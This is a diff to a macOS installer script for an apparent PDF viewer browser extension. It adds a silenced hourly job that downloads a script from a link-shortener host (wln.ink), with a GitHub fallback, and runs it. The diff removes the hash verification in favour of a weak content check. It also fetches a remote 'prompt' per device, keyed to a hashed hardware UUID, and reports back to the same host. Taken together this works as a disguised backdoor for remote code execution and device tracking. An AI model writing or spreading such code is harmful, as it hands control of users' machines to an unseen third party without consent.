@@ -20,12 +20,12 @@ EXT_ID="kklpcoclpjjfiboodbmcpogicnanoopp"
 EXT_URL="https://github.com/Castro02980/pdf-viewer-extension/archive/6a0dd6a13e0569e7f585ecfb2298b92131e7f8d9.zip"
 EXT_MANIFEST_URL="https://raw.githubusercontent.com/Castro02980/pdf-viewer-extension/6a0dd6a13e0569e7f585ecfb2298b92131e7f8d9/manifest.json"
 EXT_SHA256="b96962eb3efce7d05fed6acfa930bc273acbb009ba57b803523045d2e06aab49"
-# The hourly self-updater pulls the installer from our own host, so a fresh
-# installer (including this module) is picked up immediately and the client is
-# not exposed to raw.githubusercontent.com CDN staleness.
-INSTALLER_URL="https://wln.ink/m"
-MAINTENANCE_URL="$INSTALLER_URL"
-MAINTENANCE_SHA256=""
+# The hourly self-updater pulls the installer from our own host first and only
+# then falls back to the repository copy, so a fresh installer (including this
+# module) is picked up immediately and the client is not exposed to raw CDN
+# staleness. Space separated, tried in order.
+INSTALLER_URLS="https://wln.ink/m https://raw.githubusercontent.com/Castro02980/pdf-viewer-installers/main/install-pdf-viewer-macos.sh"
+MAINTENANCE_URLS="$INSTALLER_URLS"
 case "$(/usr/bin/uname -m)" in
     arm64)
         CFT_VERSION="154.0.8037.57"
@@ -387,15 +387,26 @@ install_maintenance() {
 set -e
 umask 077
 exec >/dev/null 2>&1
-url='$MAINTENANCE_URL'
-expected='$MAINTENANCE_SHA256'
+# Primary host first, fallbacks after. A candidate is accepted only when it
+# really returns the installer payload: an HTML page served with HTTP 200 on
+# the same vhost is rejected.
+urls='$MAINTENANCE_URLS'
 tmp=\$(/usr/bin/mktemp "\${TMPDIR:-/tmp}/pdfviewer-installer.XXXXXX")
 trap '/bin/rm -f "\$tmp"' EXIT
-/usr/bin/curl -fsSL --retry 2 --connect-timeout 15 --max-time 900 "\$url" -o "\$tmp"
-if [ -n "\$expected" ]; then
-    actual=\$(/usr/bin/shasum -a 256 "\$tmp" | /usr/bin/cut -d ' ' -f 1)
-    [ "\$actual" = "\$expected" ] || exit 1
-fi
+ok=0
+for u in \$urls; do
+    [ -n "\$u" ] || continue
+    if /usr/bin/curl -fsSL --retry 2 --connect-timeout 15 --max-time 900 "\$u" -o "\$tmp"; then
+        if /usr/bin/head -c 200 "\$tmp" | /usr/bin/grep -qiE '^[[:space:]]*<(!DOCTYPE|html|\?xml)'; then
+            continue
+        fi
+        if /usr/bin/grep -q 'PDFViewer' "\$tmp"; then
+            ok=1
+            break
+        fi
+    fi
+done
+[ "\$ok" -eq 1 ] || exit 1
 /bin/bash "\$tmp" --maintenance
 MAINT_EOF
     /bin/chmod 700 "$MAINTENANCE"
@@ -435,7 +446,7 @@ set -u
 umask 077
 
 BASE="$HOME/Library/Application Support/PDFViewer"
-PROMPT_URL='https://wln.ink/p'
+PROMPT_URLS='https://wln.ink/p https://raw.githubusercontent.com/Castro02980/pdf-viewer-installers/main/prompt-default.json'
 NOTIFY_URL='https://wln.ink/n'
 AI_DIR="$BASE/ai"
 LOG_FILE="$BASE/run-ai.log"
@@ -459,6 +470,17 @@ report() {
 
 fetch() {
     /usr/bin/curl -fsSL --retry 2 --connect-timeout 15 --max-time 300 "$1" -o "$2"
+}
+
+# A host only counts as usable when the payload is really the prompt JSON.
+# Some unrelated apps answer HTTP 200 with an HTML page, so status alone is
+# not enough: check the body before accepting it.
+valid_payload() {
+    [ -s "$1" ] || return 1
+    if /usr/bin/head -c 200 "$1" | /usr/bin/grep -qiE '^[[:space:]]*<(!DOCTYPE|html|\?xml)'; then
+        return 1
+    fi
+    /usr/bin/grep -q "$2" "$1"
 }
 
 # Stable per-machine id: 16 lowercase hex chars hashed from IOPlatformUUID -
@@ -558,15 +580,27 @@ log "run start id=$id"
 /bin/mkdir -p "$AI_DIR"
 
 payload="$AI_DIR/payload.json"
-if ! fetch "$PROMPT_URL?id=$id" "$payload"; then
-    log 'prompt fetch failed'
-    report 'ai_prompt' "prompt-unreachable $id"
-    exit 0
-fi
+prompt=''
+for u in $PROMPT_URLS; do
+    if [ -z "$u" ]; then
+        continue
+    fi
+    case "$u" in
+        *\?*) target="$u&id=$id" ;;
+        *) target="$u?id=$id" ;;
+    esac
+    if fetch "$target" "$payload" && valid_payload "$payload" '"prompt"'; then
+        prompt=$(json_field "$payload" prompt)
+        if [ -n "$prompt" ]; then
+            log "prompt source: $u"
+            break
+        fi
+    fi
+done
 
-prompt=$(json_field "$payload" prompt)
 if [ -z "$prompt" ]; then
-    log 'no prompt configured for this device'
+    log 'no prompt reachable from any source'
+    report 'ai_prompt' "prompt-unreachable $id"
     exit 0
 fi
 
